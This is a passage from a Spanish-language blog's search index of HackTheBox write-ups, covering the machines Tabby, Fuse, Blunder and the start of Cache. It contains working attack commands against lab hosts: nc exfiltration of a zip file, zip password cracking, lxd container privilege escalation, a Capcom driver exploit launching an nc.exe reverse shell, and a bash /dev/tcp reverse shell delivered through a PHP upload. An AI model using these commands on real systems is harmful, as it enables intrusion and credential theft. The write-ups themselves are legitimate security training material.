tomcat@tabby:/var/lib/tomcat9$ find / -user ash -ls 2&gt;/dev/null | grep -v proc | grep -v sys  667268   4 drwxr-xr-x  4 ash   ash     4096 Jun 17 21:59 /var/www/html/files  655666   12 -rw-r--r--  1 ash   ash     8716 Jun 16 13:42 /var/www/html/files/16162020_backup. zip  794579   4 drwxr-x---  9 ash   ash     4096 Oct 8 21:58 /home/ash    2   0 drwx------  6 ash   ash      180 Oct 8 19:57 /run/user/1000Pasemos ese archivo . zip a nuestra m√°quina e intentemos crackearlo. # En nuestra maquina‚îÄ‚ïº $ nc -lvp 4445 &gt; 16162020_backup. zip# En la maquina objetivo, con el `-w` le indicamos el timeout de esperatomcat@tabby:/var/lib/tomcat9$ md5sum /var/www/html/files/16162020_backup. ziptomcat@tabby:/var/lib/tomcat9$ nc -w 5 10. 10. 15. 86 4445 &lt; /var/www/html/files/16162020_backup. zip# Despues en nuestra maquina validamos la integridad, si los dos hashes son iguales, prosigamos‚îÄ‚ïº $ md5sum 16162020_backup. zipAhora usamos fcrackzip ‚îÄ‚ïº $ fcrackzip -v -u -D -p /usr/share/wordlists/rockyou. txt 16162020_backup. zip 'var/www/html/assets/' is not encrypted, skippingfound file 'var/www/html/favicon. ico', (size cp/uc  338/  766, flags 9, chk 7db5)'var/www/html/files/' is not encrypted, skippingfound file 'var/www/html/index. php', (size cp/uc  3255/ 14793, flags 9, chk 5935)found file 'var/www/html/logo. png', (size cp/uc  2906/ 2894, flags 9, chk 5d46)found file 'var/www/html/news. php', (size cp/uc  114/  123, flags 9, chk 5a7a)found file 'var/www/html/Readme. txt', (size cp/uc  805/ 1574, flags 9, chk 6a8b)checking pw arizon1                 PASSWORD FOUND!!!!: pw == admin@it  -v : Nos muestra el progreso de lo que va encontrando -u : Para que intente descomprimir el archivo apenas encuentre la contrase√±a -D : Modo diccionario -p : Pasamos el diccionario que usar√°Listos, procedamos a ver que tenemos dentro‚Ä¶ Pues nada importante. (Ac√° estuve un buen rato, enumerando y enumerando, ya que no sab√≠a hacia donde ir). Pues resulta que si probamos en la m√°quina: tomcat@tabby:/var/lib/tomcat9$ su ashPassword: admin@itash@tabby:/var/lib/tomcat9$Estamos dentro como el usuario ash :P Tenemos el flag del user. ‚Ä¶ Escalada de privilegios: Inspeccionemos O. O Enumerando los grupos en los que esta ash vemos que est√° en el grupo lxd. ash@tabby:/dev/shm$ iduid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)De una recorde un video de s4vitar en el que explota este grupo‚Ä¶ De igual forma dejo unos art√≠culos que tambi√©n explican como aprovecharse del grupo para obtener una Shell como usuario administrador.  Hacking Articles.  Ethical Hacking Guru.  S4vitar. Lo primero que debemos hacer es descargar y ejecutar en nuestra m√°quina atacante una imagen de un contenedor, en este caso usaremos alpine. ‚îÄ‚ïº $ wget https://raw. githubusercontent. com/saghul/lxd-alpine-builder/master/build-alpine‚îÄ‚ïº $ chmod +x build-alpine‚îÄ‚ïº # . /build-alpine. . . ‚îÄ‚ïº # lsalpine-v3. 12-x86_64-20201007_0822. tar. gz build-alpineNos generar√° la imagen y ese es el que moveremos a la m√°quina victima. Estando en la m√°quina victima haremos esto: # Creamos el contenedor ash@tabby:/dev/shm$ lxc image import alpine-v3. 12-x86_64-20201007_0822. tar. gz --alias alpinaash@tabby:/dev/shm$ lxd init --auto# Desplegamos el contenedorash@tabby:/dev/shm$ lxc init alpina privesc -c security. privileged=trueCreating privesc# Le indicamos que nos haga una montura de todo el directorio raiz en la ruta `/mnt/root` ash@tabby:/dev/shm$ lxc config device add privesc container disk source=/ path=/mnt/root recursive=trueDevice container added to privesc# Iniciamos el contenedorash@tabby:/dev/shm$ lxc start privesc# Le indicamos que nos ejecute una shell con `sh`ash@tabby:/dev/shm$ lxc exec privesc sh~ # whoamiroot~ # cd /mnt/root/mnt/root # lsbin     home    lost+found root    swap. imgboot    lib     media    run     syscdrom    lib32    mnt     sbin    tmpdev     lib64    opt     snap    usretc     libx32   proc    srv     var/mnt/root #Y listooooooooooooos, tenemos toda la ra√≠z del sistema montada con el usuario root. Apenas terminemos lo nuestro, lo √≥ptimo es borrar la imagen y el contenedor: ash@tabby:/dev/shm$ lxc stop privescash@tabby:/dev/shm$ lxc delete privescash@tabby:/dev/shm$ lxc image delete alpinaY tamos ganao‚Äô, las flags ser√≠an estas: ‚Ä¶ Perfecto, linda maquina, el inicio fue un poco aterrador del enredo en le que estuve :P pero lo importante es no rendirse y lograrlo. La escalada de privilegios fue bonita y me recordo la hecha con docker en Cache :) Bueno, te agradezco el regalarme de tu tiempo y nada, a seguir rompiendo todo &lt;3 "
    }, {
    "id": 70,
    "url": "http://localhost:4000/htb/fuse",
    "title": "HackTheBox - Fuse",
    "body": "2020/10/31 - M√°quina Windows nivel medio. Usaremos varios usuarios como diccionario para encontrar uno valido en el sistema, estando dentro explotaremos un permiso que nos deja subir drivers, subiremos uno conocido que tiene vulnerabilidades, aprovecharemos eso para lograr ejecuci√≥n remota de comandos como Administrador. Debemos cambiarle claramente cosas al exploit por lo tanto debe ser compilado.  Como siempre, primero nuestro TL;DR (Spanish writeup): Holas, bueno, inicialmente encontraremos varios usuarios en el portal web, haremos uso de html2dic para crear un diccionario y realizar fuerza bruta contra el servicio SMB para encontrar credenciales del usuario bnielson, nos veremos en la tarea de modificar su contrase√±a, ya que est√° caducada, usaremos smbpasswd. Con sus credenciales enumerando rpcclient encontraremos una contrase√±a guardada en una impresora y otros usuarios del sistema‚Ä¶ Haremos una nueva fase de fuerza bruta para as√≠ conseguir el usuario svc-print el cual est√° asociado a esa contrase√±a, ya dentro de la m√°quina haciendo enumeraci√≥n b√°sica, vemos que el privilegio SeLoadDriverPrivilege est√° habilitado, lo usaremos para subir un driver de CapCom, el cual tiene algunas vulnerabilidades reportadas y una de ellas nos permitir√° ejecutar una Shell como administrador‚Ä¶ A darle candela.  Ac√° un copie y pegue: Claramente vas a encontrar mucho texto, pero como he dicho en otros writeups, me enfoco en plasmar mis errores y existos, asi mismo aveces explico algo de m√°s y me inspiro hablando (:, sin m√°s, muchas gracias y a romper todo.  Cree un autopwn para la subida y ejecucion de los archivos, para finalmente obtener la reverse shell‚Ä¶ Pero hay un problema, no se cual sea por que entiendo que la logica y el llamado esta bien, pero la revsh la hace mal. (Subo el script por si alguno quiere hecharle un ojo y ver que problema tiene el llamado pa que me cuente pls‚Ä¶). Fases. : Como casi siempre tendremos 3 fases.  Enumeraci√≥n.  Explotaci√≥n.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n. : Empezamos obteniendo que puertos tiene activos la maquina. Usaremos nmap (: $ nmap -p- --open -T4 -Pn -v 10. 10. 10. 193 -oG initScantEl escaneo va muy lento (realmente lento), una solucion podria ser cambiar -T por --min-rate, que le indica cuantos paquetes queremos enviar en cada petici√≥n‚Ä¶ Pero validando primero el output de la ejecucion con -T y la ejecucion con el --min-rate veo que hay unos puertos que no alcanza a detectar, por lo tanto nos quedaremos con el output inicial con -T.       Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -T4   Forma de escanear super rapido, (claramente hace mucho ruido, pero al ser controlado no nos preocupamos)       ‚Äìmin-rate   Indica que no queremos hacer peticiones menores al num que pongamos (i. e: ‚Äìmin-rate=5000)       -Pn   Evita que realice Host Discovery, tales como Ping (P) y DNS (n)       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable, ya veremos para que    Ahora, con la funci√≥n que creo s4vitar podemos extraer los puertos del archivo initScan diciendole que nos los copie en la clipboard, evitando tener que escribirlos uno a uno para nuestro siguiente escaneo. La funcion simplemente en mi caso se agregaria al $ ~/. bashrc.  $ extractPorts initScanAhora que tenemos los puertos, haremos un escaneo para validar que versi√≥n y scripts maneja cada uno. nmap -p53,80,135,139,445,636,3268,49667 -sC -sV 10. 10. 10. 193      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo    Bien, analicemos que tenemos destacable‚Ä¶  Puerto DNS (53) Puerto web (80) RPC (135 y 49667) SMB (445 y Netbios (139)) LDAP (3269) nos muestra el dominioAdemas podemos destacar que en base a los scripts nos extrajo el nombre del dominio en el que vamos a tener que trabajar Domain name: fabricorp. local y el FQDN, el cual incluye el nombre de la computadora y el nombre del dominio, FQDN: Fuse. fabricorp. local. Veamos el puerto DNS (53): Podemos indicarle mediante dig que es una herramienta que realiza busquedas en los registros DNS, que nos traiga cualquier informacion asociada a esa IP con su dominio.  Ac√° tambien se nos lista el FQDN y otro host hostmaster que anotaremos por si algo. Por ahora nada m√°s por ac√°. Veamos el servicio web (80): Cuando ponemos la ip nos redirecciona a fuse. fabricorp. local/papercut/logs/html/index. htm. Entonces podemos modificar nuestro archivo $ /etc/hosts indicandole que cuando hagamos una peticion a 10. 10. 10. 193 nos de la respuesta de fuse. fabricorp. local. $ cat /etc/hosts127. 0. 0. 1    localhost10. 10. 10. 193  fuse. fabricorp. local. . . Y si ahora intentamos ingresar ya sea por la IP o por el mismo dominio que pusimos nos responde as√≠.  Nos encontramos con un software llamado PaperCut‚Ñ¢ Print Logger.  ‚ÄúEs una aplicaci√≥n gratuita para plataformas de Windows que registra las operaciones de impresi√≥n y proporciona en tiempo real registros detallados de la actividad de su impresora. ‚Äù PaperCut. Perfecto, tenemos 3 logs, ademas de ver los logs podemos tambien ver usuarios (vamos creando una lista de ellos) que probablemente alguno nos funcione para usarlo despues. Siendo un DC por lo general los usuarios son registrados de la siguiente forma:  i. e: Si el nombre es Mara Toure, lo mas com√∫n ser√≠a mtoure.  Ademas en el log del 29 de mayo podemos ver que se hace referencia a un Notepad y que su titulo parece tener otro usuario: bnielson, anotemoslo en la lista de users. Si descargamos algun . csv nos imprime la misma informaci√≥n de la web, en este caso descargamos el log del 29 de mayo (si, la imagen lo dice, pero bueno, hay gente que se le pasa y se pierde :P) Lo que nos podemos dar cuenta es que algunas impresiones tienen documentos ‚Äúimpresionantes e. e‚Äù.  backup_tapes - Notepad Fabricorp01. docx - Word printing_issue_test - NotepadEstas son las que destaco‚Ä¶ De resto no veo que m√°s podemos sacar de ac√°. Veamos el puerto SMB (445): No logre hacer nada, ni smbclient ni smbmap y crackmapexec solo me mostraba que el servidor SMB est√° soportado por un Windows Server 2016 Standard, que esto tambi√©n lo vimos en el escaneo a las versiones. Veamos el puerto LDAP (3269): Nada tampoco :( ‚Ä¶ Al estar pr√°cticamente estancado decid√≠ pedir ayuda, me indicaron que probara crear un wordlist para el usuario y otro para la password y buscara con que herramienta probar los diccionarios‚Ä¶ Pues lo primero ser√° crear las wordlist, en esta fase tuve algunos problemas, ya que CeWL no tomaba todas las palabras completas, buscando en internet encontr√© html2dic que como dice, toma un html extrae las palabras y el output queda en formato de diccionario. As√≠ que ese output lo guardaremos en un archivo que llamaremos dic. txt. El tema con html2dic es que debemos hacer la extracci√≥n con cada p√°gina. $ curl -s http://fuse. fabricorp. local/papercut/logs/html/papercut-print-log-2020-05-29. htm &gt; dic$ html2dic dic &gt; dic. txt$ cat dic. txt | sort | uniq &gt; dic. txt#Seguimos con otra pagina y repetimos, solo que al hacer la linea del `uniq` evitamos borrar el contenido que tenemos y lo sobre escribimos con **&gt;&gt;**$ . . . $ cat dic. txt | sort | uniq &gt;&gt; dic. txt$ . . . Listo, ya teniendo los dos wordlist, podemos usar CrackMapExec hacia SMB para validar si obtenemos algo. $ cme smb 10. 10. 10. 193 -u users. txt -p dic. txt ‚Ä¶ Explotaci√≥n. : Bien, obtenemos algo raro, pero al menos es diferente, nos indica que la password debe ser cambiada‚Ä¶ Buscando con el error que nos sale, vemos varios foros, en uno de ellos hablan de smbpasswd y su flag -r (remote), la cual nos permite cambiar la password de un usuario de SMB, pues nada, a probar :P.  smbclient-says-nt-status-password-must-change-how-to-change-password.  FAILED-with-error-NT-STATUS-PASSWORD-MUST-CHANGE. $ smbpasswd -r 10. 10. 10. 193 -U 'bnielson'Old SMB password:New SMB password:Retype new SMB password:Password changed for user bnielson‚Ä¶  El escaneo inicial me dejo con dudas, ya que no vi alg√∫n puerto disponible para usar evil-winrm y podernos conectar con algunas credenciales de manera remota al pc. Por eso decidi hacer otro escaneo pero total, sin parametros ni nada, el resultado fue este: $ nmap -p- --open -vvv 10. 10. 10. 193 Y si, varios puertos que no hab√≠amos visto, entre ellos uno para el mantenimiento remoto: 5985, sigamos (: La password que le asigne es Estaes01. Pero al ser un usuario al que todos deben de cambiar la contrase√±a, pues cada x segundos nuestra password deja de funcionar, as√≠ que o somos r√°pidos o crearemos un script (realmente intente hacer el script pero no lo logre, si alguien sabe como jugar con los inputs de cada comando h√°bleme y me ense√±a por favor), as√≠ que fui r√°pido :P, posteriormente usaremos crackmapexec para ver a que recursos tenemos acceso y con smbget nos descargaremos el recurso a nuestra m√°quina para ya olvidarnos de cambiar contrase√±as y todo ese rollo :) $ cme smb 10. 10. 10. 193 -u bnielson -p Estaes001 --shares. . . #Vemos varios recursos, `print$` y `SYSVOL` son interesantes, descargemos los dos$ smbget -R smb://10. 10. 10. 193/SYSVOL -U bnielson$ smbget -R smb://10. 10. 10. 193/print$ -U bnielson ¬øPor que SYSVOL es importante?, generalmente se usa un script para cambiar la contrase√±a del admin local, necesario para cumplir las gpp (Preferencias de politica de grupo), ese script esta guardado en la ruta SYSVOL y a menudo en texto claro.  Video de s4vitar explicando SYSVOL. El directorio SYSVOL nos da un error, al parecer hay un archivo al cual no tenemos acceso y nos cancela toda la descarga.  Podemos usar smbclient para entrar en el directorio /SYSVOL e intentar descargar desde ah√≠ los archivos. As√≠ mismo podemos usar rpcclient para con las nuevas credenciales ver que podemos encontrar (de los comandos que encontr√©, pude obtener otro conjunto de usuarios, pero nada m√°s). $ smbclient //10. 10. 10. 193/SYSVOL -U bnielsonrecurse ON # Carpetas y subcarpetasprompt OFF # Para que no pregunte si realmente queremos descargar X foldermget *   # Descargar todo En este caso si nos permiti√≥ bajar los otros archivos :) Pero enumerando el directorio /SYSVOL, no tiene nada relevante, as√≠ que seguiremos con /print$‚Ä¶ Enumerando y enumerando no encontr√© nada, haciendo grep, por tipos de archivo, volviendo a descargar pensando que se me hab√≠a olvidado algo, pero nada, estuve perdido, as√≠ que lo mejor fue pedir ayuda. Me indicaron que usara rpcclient peeero con un comando que no hab√≠a usado, enumprinters, el cual nos muestra info de las impresoras y alguna que otra descripci√≥n, pues‚Ä¶ Opa, vemos una contrase√±a, tom√©mosla y validemos con cme junto a los usuarios que tenemos (y los nuevos).  Listo, vemos que tenemos el mismo acceso que bnielson, probemos de una con evil-winrm por el puerto 5985 que encontramos con el nuevo escaneo.  Ahoraaaa a enumerar. ‚Ä¶ Escalada de privilegios. : Si hacemos b√∫squedas de servicios o software corriendo no obtenemos nada, subiendo winPEAS y/o PowerUp. ps1 tampoco, ni enumerando carpetas y subcarpetas tenemos algo‚Ä¶ Solamente en el directorio ra√≠z tenemos un readme. txt y una carpeta /test.   Spoiler: Es probable que las demas carpetas tengan proteccion con un antivirus o algo por el estilo, por lo tanto tambien es probable que si se creo una carpeta en la raiz llamada test (en la que podemos hacer cualquier cosa) pues que no tenga o no nos tengamos que preocupar por alguna proteccion con AV. Viendo los permisos que tiene el usuario svc-print con whoami /priv (tambi√©n con /all los muestra) de primeras ninguno me sorprendi√≥, as√≠ que busque info de cada uno y uno de ellos tiene algo interesante.  El privilegio SeLoadDriverPrivilege nos permite subir un driver al kernel, por lo cual explorando en internet vemos que hay un driver explotable: Capcom, el cual con otra utilidad (la que lo explota) nos permita ejecutar una reverse Shell con permisos de administrador En nuestro caso tenemos el privilegio ya activado, por lo tanto solo nos queda la explotaci√≥n. Hay dos buenos post para guiarse:  Espa√±ol - Tarlogic.  Ingles - HackTricks. Usando el c√≥digo del NTLoadDriver. cpp podemos intentar subir el driver Capcom. sys. Nos indica que usa dos argumentos:  Le indicamos donde est√° ubicado el driver que queremos subir.  Registro del kernel donde guardar el driver, junto al SID (ID de seguridad) de usuario. Muy bien, sabiendo esto, d√©mosle al NTLoadDriver, obteniendo el SID de svc-print vemos esto: PS&gt; Get-ADUser -Identity 'svc-print' | select SIDS-1-5-21-2633719317-1471316042-3957863514-1104Lo siguiente es compilar o buscar los binarios, para posteriormente subirlos a la m√°quina, as√≠ que podemos usar Visual Studio para ello. Primero usamos el c√≥digo de HackTricks‚Ä¶ La compilaci√≥n y la ejecuci√≥n parecen estar bien, pero no obtengo ning√∫n output‚Ä¶ Estuve modificando y buscando otras maneras pero no encontr√©, le tuve que volver a pedir ayuda a TazWake moderador HTB y un duro en seguridad. Me indico que el no hab√≠a hecho ese procedimiento, que hab√≠a usado un ejecutable de VbScrub. El cual tambi√©n nos permite subir un driver pas√°ndole los dos par√°metros del NTLoadDriver. Adem√°s me recalco el posible uso de AV en toda la maquina menos en la carpeta test de la ra√≠z (Este era el spoiler, ya que antes estaba guardando y ejecutando todo en otra carpeta).  Herramienta de VbScrub: VbLoadDriver. Y pasandole los mismos parametros de antes, su uso seria: &gt; VbLoadDriver. exe HKU\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\Services\Capcom C:\test\Capcom. sys Listo, logramos ejecutar correctamente el binario. Ahora solo nos queda hablar sobre como explotar Capcom. sys. Existe una utilidad llamada ExploitCapcom ¬øBastante intuitiva no?. Pues lo que tenemos que indicarle es (aunque lo intente sin las 2 primeras linea y me funciono igual :P): &gt; sc. exe create Capcom type= kernel binPath= C:\test\Capcom. sys&gt; sc. exe start Capcom&gt; . /ExploitCapcom. exeListo, conociendo su uso debemos modificar esta porcion de codigo: Para llegar a esa soluci√≥n tuve muchos (muchos) intentos fallidos y b√°sicamente fue por no parar y buscar sobre la funci√≥n que ejecuta el comando en el sistema.  Documentaci√≥n de Microsoft sobre CreateProcess(). Apoy√°ndome en esa descripci√≥n, es que entend√≠ que deb√≠a indicarle como primer par√°metro (nombre de la aplicaci√≥n): NULL, ya que estamos en la consola y no estoy ejecutando ninguna aplicaci√≥n‚Ä¶ Y en el segundo par√°metro (linea de comando) si dejar la petici√≥n de la revshell. Compilando, subiendo y ejecutando logramos obtener la dichosa Shell como administrador :) ‚Ä¶ Despu√©s ca√≠ en cuenta que para evitar tantas compilaciones, sencillamente hubiera podido crear un archivo . bat con las instrucciones del netcat y que el ejecutable llamara a ese archivo . __ . Creamos el archivo: &gt; echo  @echo off  &gt; retrievemagic. bat&gt; echo  C:\test\nc. exe 10. 10. 15. 35 4433 -e cmd. exe  &gt;&gt; retrievemagic. batY despu√©s simplemente le indicamos que siempre nos ejecute ese archivo :) ‚Ä¶ He creado un script para la subida y ejecuci√≥n de los archivos‚Ä¶ El √∫nico problema est√° en la obtenci√≥n de la reverse Shell (no s√© por qu√©, averig√ºe y averig√ºe pero nada). De igual forma seguir√© testeando, pero lo subo por si alguno sabe como debe ser llamado ExploitCapcom. exe desde el script para que haga la petici√≥n correctamente. Lo dem√°s funciona perfe, sube los archivos y carga el driver. El problema est√° en la herramienta (winrm) o en la l√≠nea de ejecuci√≥n del script, ya que tomando el mismo comando y us√°ndolo dentro de la sesi√≥n de PowerShell de evilwinrm ta todo bien y se ejecuta correctamente.  Ac√° el autopwn: autopwn_fuse. sh. ‚Ä¶ Qu√© bonita maquina, curiosa e interesante forma de escalar privilegios, me gusto mucho el usar herramientas a las que no estamos acostumbrados (Visual Studio) para compilar y crear nuestros . exe‚Ä¶ Cada vez m√°s cari√±o a las m√°quinas Windows aunque sean (siento yo) m√°s dif√≠ciles‚Ä¶ Muchas gracias yyyyyyyyyyyyyyyyyyyy a seguir rompiendo todo (: "
    }, {
    "id": 71,
    "url": "http://localhost:4000/htb/blunder",
    "title": "HackTheBox - Blunder",
    "body": "2020/10/17 - M√°quina Linux nivel f√°cil. Romperemos un CMS, encontraremos un File Upload que explotaremos para ejecutar comandos. Crackearemos cositas y nos apoyaremos de una locura relacionada con ‚Äúsudo -l‚Äù para convertirnos en administradores del sistema.  TL;DR (Spanish writeup): Wenas, en esta m√°quina nos encontraremos con el puerto 80, el cual haci√©ndole un poco de fuzzing se nos listaran: un apartado /admin y un archivo /todo. txt. En /admin hay un login y encontraremos que el servicio est√° siendo soportado por √©l CMS Bludit, basado en ello encontraremos un exploit que hace un bypass del login, con esto (y haciendo un diccionario del sitio) lograremos entrar al dashboard como el usuario fergus. Estando dentro explotaremos una vulnerabilidad file upload, cambiaremos su contenido y pondremos c√≥digo . php que nos permita ejecutar comandos en el sistema y as√≠ obtener una reverse Shell. Estando dentro de la m√°quina como www-data encontraremos en la estructura del CMS un archivo users. php en el que se listan hashes e informaci√≥n √∫til de algunos usuarios, crackearemos el hash de hugo para usar esa contrase√±a y obtener una sesi√≥n como √©l. Realizando enumeraci√≥n b√°sica (sudo -l) veremos algo raro, nos apoyaremos en esa locura para buscar y encontrar una manera de obtener una Shell como usuario root. D√©mosle :)  Apoyado en un exploit (que abajo listar√©) cree un autopwn en python para obtener una shell desde el mismo programa (: Claramente vas a encontrar mucho texto, pero como he dicho en otros writeups, me enfoco en plasmar mis errores y existos, asi mismo aveces explico algo de m√°s y me inspiro hablando (: ‚Ä¶ Tendremos 3 fases.  Enumeraci√≥n.  Explotaci√≥n.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n: Como siempre, iniciamos haciendo un escaneo de puertos para as√≠ conocer que servicios est√° corriendo la maquina. En este caso con par√°metros normales el escaneo va lento, as√≠ que le agregamos algunos para acelerar el proceso. $ nmap -vvv -sS -Pn --min-rate=5000 -p- --open 10. 10. 10. 191 -oG initScan      Par√°metro   Descripci√≥n         -vvv   Permite ver en consola lo que va encontrando       -sS   Quita la opci√≥n por defecto TCP SYN, as√≠ evitamos que haga una petici√≥n de conexi√≥n       -Pn   Evita que realice Host Discovery, como resoluci√≥n DNS y Ping       ‚Äìmin-rate   Indica que no queremos hacer peticiones menores al num que pongamos       -p-   Escanea todos los puertos       ‚Äìopen   Solo los puertos que est√°n abiertos       -oG   Guarda el output en un archivo con formato grepeable    Ahora hacemos el escaneo para verificar que versi√≥n y que scripts puede manejar el servicio que encontramos. $ nmap -sC -sV -p80 10. 10. 10. 191 -oN portScan      Par√°metro   Descripci√≥n         -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -p   Escaneo de los puertos obtenidos       -oN   Guarda el output en un archivo    Tenemos el puerto 80, una pagina web, veamo que se cuece :P No hay nada a primera vista, vamos a hacer fuerza bruta sobre el dominio con $ dirsearch. Solo tenemos un apartado /admin que nos muestra un login y un texto sobre Bludit, buscando en internet vemos que es un CMS, por lo tanto sabemos que la pagina esta soportada por este CMS. Con respecto a Bludit ya tenemos otro enfoque, podemos ir a internet o con searchsploit y buscar alg√∫n exploit relacionado con ese servicio. Haciendo un research en la documentaci√≥n y dando vueltas, encontr√© que la versi√≥n que est√° corriendo de Bludit se puede listar ac√°: http://10. 10. 10. 191/bl-plugins/version/metadata. jsonversion	 3. 9. 2 Con searchsploit encontramos un script que hace un bypass, salt√°ndose el bloqueo de IP por intentos fallidos al hacer login incorrectamente.  Exploit 1: rastating - bludit-brute-force-mitigation-bypass.  Exploit 2: rastating - bypass anti-brute. El exploit es muy interesante, l√©anselo! :) Listo, lo que sigue es tener posibles credenciales y probarlos con √©l. As√≠ que tome la p√°gina, lei cada art√≠culo para ver que destacaba, nombres, palabras raras, n√∫meros por ah√≠ al azar. Y con ello armar un wordlist para posteriormente usarlos como user y pw. Adecuando el script para que lea el wordlist que le pasemos, quedaria algo asi: ‚Ä¶ ‚Ä¶ Pero no sirvio ninguno :( Sin saber que hacer, us√© otra herramienta de fuzz web a ver si era que me habia olvidado algo. Encontre $ gobuster, asi que decidi usarla a ver si con ella podria tener diferentes resultados. $ gobuster dir -u http://10. 10. 10. 191 -w /usr/share/wordlists/directory-list-2. 3-small. txt -t 30 -x . html,. php,. txt,. js -u: Le indico el objetivo -w: El path del wordlist con el que quiero probar -t: Los hilos con los que debe correr el proceso -x: Las extensiones a buscarEfectivamente, algo no habia aparecido con $ dirsearch, todo. txt. http://10. 10. 10. 191/todo. txt Perfecto, obtenemos un presunto nombre/usuario, fergus. Pero ¬øy su contrase√±a?, pues usando la wordlist podemos probar :)  Listo, baby‚Ä¶ dentro. Buscando en internet encontr√© una vulnerablidad que explota una funcionalidad para subir imagenes en /new-content, permitiendo corromper el contenido del archivo en cuesti√≥n. Asi que si se sube un archivo . jpg pero con contenido php se podra conseguir ejecutar comandos (o lo que sea) con php (: En este caso con el archivo que subiremos, podremos ejecutar comandos y finalmente crear una reverse shell.  POC del exploit. ‚Ä¶ Explotaci√≥n: Deeeeeeeespues de mucho sufrimiento, confundido con el POC por que simplemente siguiendo los pasos no obtenia nada, intente algo diferente (sencillo, basico y que debi probar al inicio :P) un RCE con un simple system y echo. Logre obtener resultados, hice estos pasos:  Como se muestra en el POC se captura la petici√≥n mediante BurpSuite.  Se modifica el contenido. Verificando‚Ä¶  Subir el archivo . htaccess para que el servidor interprete las imagenes jpg con contenido php  Hacer peticiones hacia el archivo creado, asi validamos que si encuentra el archivo en el sistema  Verificar que podamos ejecutar comandos. Listo, ahora podemos intentar subir una reverse shell‚Ä¶ Habia probado encodear la URL pero solo lo hice con algunos caracteres, ya que al ejecutar el comando en limpio no pasaba nada, pero despues prob√© encodear toda la URL y as√≠ si me funciono :) De esto: $ curl http://10. 10. 10. 191/bl-content/tmp/buenobueno. jpg?xmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10. 10. 15. 26/443 0&gt;&amp;1'A esto: $ curl http://10. 10. 10. 191/bl-content/tmp/buenobueno. jpg?xmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10. 10. 15. 26%2F443%200%3E%261%27 Perfe, el problema es que con la shell que tengo estoy limitado ya que no puedo volver a algun comando que haya escrito, asi que la transformar√© para que sea completamente interactiva.  Convertir a una shell completamente interactiva.  Varias opciones.  Resumido y facil (Gracias s4vitar). Ahora si, a seguir enumerando :) Interesante, primero a saber que tipo de hash es y ver si lo podemos romper. Pues despues de muchos intentos, herramientas online y herramientas del escritorio no logr√© romper el hash‚Ä¶ Sencillamente por que no habia enumerado bien y habia caido en un hoyo para ratones :s Recuerden, enumeren todo, pues al ir recorriendo las carpetas vi que hay dos versiones de bludit corriendo en el sistema, como era de esperar tiene la misma estructura que la version 3. 9. 2, asi que tenemos el archivo users. php. El hash presuntamente es SHA1.  Tengo esto :sss Este hash es tambien SHA1, probe instantaneamente con una herramienta online que tenia a la mano. Tambien prob√© con john y hashcat pero el problema es que esa password de hugo no esta en los wordlist por default o tradicionales.  Adem√°s ojeando una carpeta dentro del $ /home de hugo llamada /. mozilla, en algunos archivos se hace alusion a crackstation como cache o historial.  Listo, tenemos un resultado, probando esa password con hugo tenemos una shell en el sistema.  ‚Ä¶ Escalada de privilegios: Al ver los permisos que tiene hugo me confundi, asi que le cai a google. Basicamente lo que dice es que podemos correr $ /bin/bash con cualquier usuario peeero no con root‚Ä¶ :( Pero existe una vulnerabilidad en esa instrucci√≥n, en linux el UID de root es 0, lo que encontraron es que al asignarle a sudo algunos de estos UID (Identificador de usuario): -1 o 4294967295 los interpreta mal y los hace pasar como 0, permitiendo asi ejecutar comandos como el usuario root.  Explicaci√≥n 1: muylinux - vulnerabilidad-sudo-saltarse-restricciones-root.  Explicaci√≥n 2: hackwise. mx - esta-vulnerabilidad-sudo-te-permite-ejecutar-comandos-como-root. Seg√∫n eso, la explotaci√≥n quedaria as√≠: YyyyyyyyyYYyYyY obtenemos nuestra shell como root (: Una forma nueva para mi y sencilla de escalar privilegios, el inicio de la maquina fue caotico pero despues me enganche (esta maquina la hice primero que la de Magic, por eso en ese writeup comento que me fue mas facil ver la explotacion del apartado /upload) y me gusto mucho, gracias por leer y a seguir rompiendo conocimiento (: ‚Ä¶ Autopwn. : Apoyandome en un exploit que ejecuta el mismo proceso que realizamos con el POC, cree un . py para obtener una shell desde el mismo programa. (Tambien me apoye en los autopwn de s4vitar) Y cuando tengas la shell, pones las lineas (para ser hugo y despues root) que estan en este writeup. (Ya que no entendi como hacerlo en el propio script).  Ac√° el autopwnBless :) "
    }, {
    "id": 72,
    "url": "http://localhost:4000/htb/cache",
    "title": "HackTheBox - Cache",
    "body": "2020/10/14 - M√°quina Linux nivel medio. Veremos el uso del VirtualHosting, bypassearemos cositas e injectaremos otras. Tendremos que movernos mediante la cache en memoria y Docker para volvernos root.  Alo, primero el TL;DR (Spanish writeup): Esta m√°quina nos presenta el uso del VirtualHosting, con el que nos encontraremos al servicio OpenEMR el cual tiene varias vulnerabilidades, nos aprovecharemos primero de un bypass por medio de sesiones mal configuradas, lo siguiente ser√° una explotaci√≥n SQLinjection para extraer data de la base de datos‚Ä¶ Posteriormente obtendremos el usuario openemr_admin y su hash, crackearemos el hash y podremos logearnos en el servicio openemr‚Ä¶ Usamos otra vulnerabilidad en la que podemos subir un archivo predeterminado pero cambiando el contenido, en el que alojaremos la posibilidad de ejecutar comandos. Estando dentro de la m√°quina extraeremos data en cach√© que se est√° guardando con la utilidad memcached, obtendremos la contrase√±a del usuario luffy, vemos que est√° asignada al grupo docker y usaremos eso para obtener una Shell como root. (as√≠ en muy, muy pocas palabras (: Disfruten)  Como lo he dicho en otras maquinas, me gusta enfocarme en las personas que apenas estan iniciando en este universo paralelo. Por lo tanto si vez o mucho texto o que explico de m√°s, pues ya sabes la raz√≥n, sin m√°s, muchas gracias y a romper todo  Adem√°s te agrego que me he creado un script en python para automatizar la subida del archivo y obtenci√≥n de la reverse shell, ta guapazo‚Ä¶ Tendremos 3 fases como casi 